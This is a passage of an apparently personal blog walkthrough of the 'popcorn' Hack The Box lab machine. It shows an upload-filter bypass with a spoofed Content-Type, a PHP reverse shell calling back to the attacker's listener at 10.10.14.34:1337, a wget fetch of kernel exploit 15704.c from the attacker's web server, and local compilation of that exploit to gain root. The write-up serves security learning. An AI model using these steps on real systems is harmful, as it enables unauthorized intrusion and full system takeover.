+<p>Let’s replay with the Request Editor Feature in ZAP it by right clicking on the data and editing the header as:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------------------6880877471789511041406832871
+Content-Disposition: form-data; name="file"; filename="evil.php"
+Content-Type: image/png
+ 
+</code></pre></div></div>
+
+<p>This time I get the following response data:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Upload: evil.php&lt;br /&gt;Type: image/png&lt;br /&gt;Size: 2.962890625 Kb&lt;br /&gt;Upload Completed. &lt;br /&gt;Please refresh to see the new screenshot.
+</code></pre></div></div>
+
+<p>Looks like the server doesn’t restrict the upload types.</p>
+
+<p>I set up a listener on my Linux with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> 1337
+</code></pre></div></div>
+
+<p>Right click the “no image found” image url and get a shell:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on [any] 1337 ...
+connect to [10.10.14.34] from (UNKNOWN) [10.10.10.6] 48695
+</code></pre></div></div>
+
+<p>This times out after 20 seconds because of the ZAP proxy settings:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Failed to read http://10.10.10.6/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php within 20 seconds, check to see if the site is available and if so consider adjusting ZAP's read time out in the Connection options panel.
+</code></pre></div></div>
+
+<p>I disable the proxy and shutdown ZAP as its done its job and re-trigger the connection.</p>
+
+<p>With this access I have a low priv shell and can claim the user flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="priv-escalation">Priv Escalation</h2>
+
+<p>I try to upgrade to a bash shell with python:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre></div></div>
+
+<p>But the shell is flaky and times out, I need a better shell but my php sucks.
+Luckily Kali comes equipped with webshells.</p>
+
+<p>I reactivate the proxy on FireFox for ZAP, only this time when I replay I also specify my IP address and 1337 as the port number as well as the Content Type:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------------------1429460769362258019814915645
+Content-Disposition: form-data; name="file"; filename="php-reverse-shell.php"
+Content-Type: application/x-php
+ 
+.
+.
+.
+ 
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.14.34';  // CHANGE THIS
+$port = 1337;       // CHANGE THIS
+ 
+</code></pre></div></div>
+
+<p>This time my listener returns:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to [10.10.14.34] from (UNKNOWN) [10.10.10.6] 54293
+Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
+00:06:57 up  2:08,  0 users,  load average: 3.13, 2.86, 1.74
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: can't access tty; job control turned off
+</code></pre></div></div>
+
+<p>and when I upgrade to bash:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<p>I get:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/$
+</code></pre></div></div>
+
+<p>Typically I now would hammer through a few different enumeration techniques, following a guide like g0tmi1k’s awesome introduction to [Basic Linux Privilege Escalation] (https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/), however I’m instantly drawn to the uname output my shell gave me:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
+</code></pre></div></div>
+
+<p>This is a really old kernel build and it probably has a few exploits kicking about.</p>
+
+<p>Checking searchsploit gives dozens and dozens, but a couple of nuke level exploits stick out:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit linux kernel 2.6 nelson
+----------------------------------------------------------------------------- ----------------------------------------
+Exploit Title                                                               |  Path
+                                                                            | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------- ----------------------------------------
+Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privileg | exploits/linux/local/15704.c
+Linux Kernel &lt; 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Es | exploits/linux/local/17787.c
+----------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+</code></pre></div></div>
+
+<p>Vaguely recalling a morning commute read the Full and Half Nelsons ring a bell as a reliable and deadly exploit.</p>
+
+<p>After reading through 15704.c and doing a test compile on the attacker it looks decent enough but I need a compiler for i686 arch to run.</p>
+
+<p>I check for the gcc compiler on popcorn:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which gcc
+</code></pre></div></div>
+
+<p>to get</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/gcc
+</code></pre></div></div>
+
+<p>Sweet, if I transfer the exploit it should compile, now on a new window I pop a quick python webserver on the attacker:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo python -m SimpleHTTPServer 80
+</code></pre></div></div>
+
+<p>Back to popcorn I move to /tmp pull the exploit over with wget and compile:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /tmp &amp;&amp; wget http://10.10.14.34/15704.c
+gcc 15704.c -o evil
+</code></pre></div></div>
+
+<p>I run the exploit</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./evil
+</code></pre></div></div>
+
+<p>Boom! I’m root! W00tW00t!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id
+uid=0(root) gid=0(root)
+</code></pre></div></div>
+
+<p>Time to get the flags.</p>
+
+:ET
